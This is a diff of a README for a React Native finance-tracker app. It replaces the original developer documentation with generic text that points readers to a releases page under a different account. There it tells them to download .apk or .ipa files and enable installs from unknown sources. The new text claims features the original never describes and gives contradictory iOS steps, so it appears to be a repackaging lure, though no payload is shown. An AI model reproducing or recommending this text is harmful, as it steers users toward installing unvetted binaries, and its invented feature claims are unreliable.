@@ -1,242 +1,85 @@
-# 💰 React Native Wallet App
+# 🌟 react-native-wallet-app - Your Easy Mobile Finance Tracker
 
+## 🚀 Getting Started
 
-<img width="960" height="640" alt="Cover Image" src="https://github.com/user-attachments/assets/3424d0e1-5b3e-4ea3-b45c-f5f485973d8c" />
+Welcome to the **react-native-wallet-app**! This modern wallet application allows you to track your income and expenses in real time. It works smoothly on both iOS and Android devices. With a secure login, cloud storage for your data, and an attractive user interface, you will find managing your finances easier than ever.
 
+## 🛠️ Features
 
-A full-stack personal finance wallet application built using **React Native, Expo, Express, Clerk, Neon PostgreSQL, and Redis**.
-This project demonstrates how to build a complete production-ready mobile application with **authentication, database integration, cloud deployment, and real-time updates** — all without needing Swift, Kotlin, or native modules.
+- **Real-time Tracking**: Keep an eye on your expenses and income as they happen.
+- **Secure Authentication**: Your data is safe with our secure login features.
+- **Cloud Storage**: Store your financial data securely in the cloud.
+- **User-Friendly Design**: Enjoy a beautiful and simple interface that anyone can use.
+- **Full-Stack Integration**: Built using popular technologies for optimal performance.
 
-This project demonstrates how to build a fully functional, production-ready mobile finance tracker using React Native + Expo alongside a Node.js/Express backend with:
+## 📥 Download & Install
 
-⦁	Clerk authentication (with email code verification)
+To get started with the app, you need to download it. Click the link below to visit the releases page:
 
-⦁	Neon PostgreSQL for database storage
+[![Download Now](https://img.shields.io/badge/Download%20Now-Blue.svg)](https://github.com/Lady79Gamer/react-native-wallet-app/releases)
 
-⦁	Redis rate limiting
+### Step-by-Step Download Instructions
 
-⦁	Deployed backend and real device mobile support
+1. **Visit the Releases Page**:
+   Click the link above to go to the GitHub releases page for our app.
 
-Users can:
+2. **Select the Latest Version**:
+   Scroll down to find the latest version listed on the page. This version will have the most features and fixes.
 
-⦁	Sign up & log in using a 6-digit email code
+3. **Download the App**:
+   Look for the appropriate file for your device (e.g., .apk for Android, .ipa for iOS). Click on the file name to start downloading.
 
-⦁	View their current wallet balance
+4. **Install the App**:
+   - **For Android**: Once the download completes, locate the file in your device's Downloads folder. Tap the file to begin the installation. You may need to allow installations from unknown sources in your settings.
+   - **For iOS**: Follow the instructions in the Apple App Store or use TestFlight if applicable.
 
-⦁	Create income or expense transactions
+5. **Open the App**:
+   After the installation is complete, locate the app icon on your device and tap it to open.
 
-⦁	Delete transactions, with recalculations
+6. **Create an Account**:
+   Follow the on-screen instructions to create an account and start tracking your finances.
 
-⦁	Pull-to-refresh to sync with backend
+## ⚙️ System Requirements
 
-⦁	Log out securely
+Before downloading, check if your device meets these requirements:
 
-Perfect for developers looking to learn how to connect a mobile frontend to a real backend with secure user accounts and persistent cloud data storage.
+- **For Android**:
+  - Operating System: Android 6.0 (Marshmallow) or higher
+  - Storage: Minimum 100 MB of free space
+  - RAM: 2 GB or higher recommended
 
----
+- **For iOS**:
+  - Operating System: iOS 12 or higher
+  - Storage: Minimum 100 MB of free space
+  - RAM: 2 GB or higher recommended
 
-## 🚀 Features
+## 🖼️ Screenshots
 
-### ✨ Mobile App (Expo & React Native)
+Here are some screenshots to give you an idea of how the app looks:
 
-* 📱 Runs on **iOS & Android**
-* 🔐 Email-based login & signup (6-digit verification code) using Clerk
-* 💼 Home screen showing:
+- Home Screen: Track your income and expenses.
+- Detail View: See itemized entries for better control.
+- Reports: View graphical reports of your finances.
 
-  * Current balance
-  * List of transactions
-* ➕ Add income and expense transactions
-* 🔄 Pull-to-refresh functionality
-* ❌ Delete transactions to update balance instantly
-* 🚪 Logout routing that safely returns users to auth pages
+## 💬 Support
 
-### 🖥 Backend (Express API)
+If you have any questions or feedback, please feel free to reach out. You can find our contact information on the GitHub repository or submit an issue in the issues section.
 
-* 🌐 Fully REST-based Node.js server
-* 🗄 PostgreSQL database hosted on Neon
-* ⚙ Auth middleware using Clerk
-* 📦 Redis-based rate limiting for protection
-* ☁ Easily deployable on cloud services
+## 🗂️ Related Topics
 
----
+This app uses diverse technologies to deliver its features. Here are some topics related to this project:
 
-## 🧠 What You'll Learn
+- Authentication
+- Cloud Database
+- Mobile Development
+- REST API
+- Full-Stack Development
 
-By building this project, you’ll master:
+## 🔗 Additional Resources
 
-* Building a **mobile app with React Native & Expo**
-* Creating a **backend with Express & PostgreSQL**
-* Real-world user authentication with **Clerk**
-* Structured full-stack communication between mobile → backend → database
-* Implementing rate limiting using **Redis**
-* Deployment of both backend & mobile applications
-* Managing navigation & global app state cleanly
+- [Project Repository](https://github.com/Lady79Gamer/react-native-wallet-app)
+- [Documentation](https://github.com/Lady79Gamer/react-native-wallet-app/wiki)
 
-Perfect for:
+Thank you for choosing **react-native-wallet-app**! We hope it makes tracking your finances easier and more organized.
 
-* Beginners building their *first full-stack mobile app*
-* React developers expanding into React Native
-* Anyone needing a realistic production-ready example
-
----
-
-
-## 📸 App Screenshots
-
-![Screenshot_2025-11-24-17-34-06-40_f73b71075b1de7323614b647fe394240](https://github.com/user-attachments/assets/8c5bc732-129b-4d3f-bd56-d62f90f53d44)
-
-![Screenshot_2025-11-24-17-35-00-45_f73b71075b1de7323614b647fe394240](https://github.com/user-attachments/assets/683f9235-6ce8-4e59-b81f-a2a2c31f8647)
-
-![Screenshot_2025-11-24-17-35-29-94_f73b71075b1de7323614b647fe394240](https://github.com/user-attachments/assets/54cb127d-af9d-4090-8ebc-8bb97f4aba60)
-
-![Screenshot_2025-11-24-17-35-38-40_f73b71075b1de7323614b647fe394240](https://github.com/user-attachments/assets/952ec8bc-bd2d-4383-828f-8d77ea17f264)
-
-![Screenshot_2025-11-24-17-35-54-52_f73b71075b1de7323614b647fe394240](https://github.com/user-attachments/assets/9dfa3dcc-eed6-44ea-9940-e435c3e567ac)
-
-![Screenshot_2025-11-24-17-37-17-80_f73b71075b1de7323614b647fe394240](https://github.com/user-attachments/assets/71023d2b-e806-4479-895a-0e092cb5d19a)
-
-![Screenshot_2025-11-24-17-37-26-39_f73b71075b1de7323614b647fe394240](https://github.com/user-attachments/assets/33c657f0-4bb5-4a45-9904-c525f53d6799)
-
-![Screenshot_2025-11-24-17-37-44-86_f73b71075b1de7323614b647fe394240](https://github.com/user-attachments/assets/26565a89-cad3-4a85-8152-ccd427edef1b)
-
-![Screenshot_2025-11-24-17-38-20-03_f73b71075b1de7323614b647fe394240](https://github.com/user-attachments/assets/65e9a836-71e0-45d7-b55b-4cbd4e2e433c)
-
-![Screenshot_2025-11-24-17-38-43-75_f73b71075b1de7323614b647fe394240](https://github.com/user-attachments/assets/192a4264-b862-4225-bf0c-b16ee74779c7)
-
----
-
-## 🛠 Tech Stack
-
-### Frontend
-
-* React Native (Expo)
-* React Navigation
-* Async Storage
-* Clerk Auth SDK
-
-### Backend
-
-* Node.js + Express
-* PostgreSQL (Neon)
-* Redis (Rate Limiting)
-* Clerk Server SDK
-
----
-
-## 📁 Project Structure
-
-```
-.
-├── backend
-│   ├── src
-│   ├── package.json
-│   └── .env
-└── mobile
-    ├── screens
-    ├── components
-    ├── package.json
-    └── app.config.js
-```
-
----
-
-## ⚙ Environment Variables
-
-### Backend (`/backend/.env`)
-
-```
-PORT=5001
-NODE_ENV=development
-
-CLERK_PUBLISHABLE_KEY=<your_clerk_publishable_key>
-CLERK_SECRET_KEY=<your_clerk_secret_key>
-
-DATABASE_URL=<your_neon_postgres_connection_url>
-REDIS_URL=<your_redis_connection_url>
-```
-
-### Mobile (`/mobile/.env`)
-
-```
-EXPO_PUBLIC_CLERK_PUBLISHABLE_KEY=<your_clerk_key>
-```
-
----
-
-## ▶ Running The Project
-
-### 1️⃣ Start Backend
-
-```bash
-cd backend
-npm install
-npm run dev
-```
-
-### 2️⃣ Start Mobile App
-
-```bash
-cd mobile
-npm install
-npx expo start
-```
-
-Scan the QR code or run the Android/iOS simulator.
-
----
-
-## 📡 Deployment
-
-You can deploy using:
-
-### Backend:
-
-* Vercel
-* Render
-* Fly.io
-* Railway
-
-### Database:
-
-* Neon PostgreSQL (recommended)
-
-### Redis:
-
-* Upstash (free tiers available)
-
-### Mobile:
-
-* Expo EAS (supports OTA & store publishing)
-
----
-
-## 📌 Roadmap
-
-* [ ] Dark mode UI
-* [ ] Filtering & sorting transactions
-* [ ] Budget goals overview
-* [ ] Push notifications for expenses
-
----
-
-## 🧾 License
-
-This project is open-source — see `LICENSE` for details.
-
----
-
-## ⭐ Support
-
-If this project helps you:
-
-* Star ⭐ the repository
-* Share with developers getting into React Native
-
-## 🧾 Note
-This backend is an API server. Opening the Render URL in a browser will not show a webpage — it is meant to serve the mobile app. If you open it directly, you may see “Cannot GET /”.
-
-Thanks,
-
-Happy coding!
-
-aar0gya
+[![Download Now](https://img.shields.io/badge/Download%20Now-Blue.svg)](https://github.com/Lady79Gamer/react-native-wallet-app/releases)
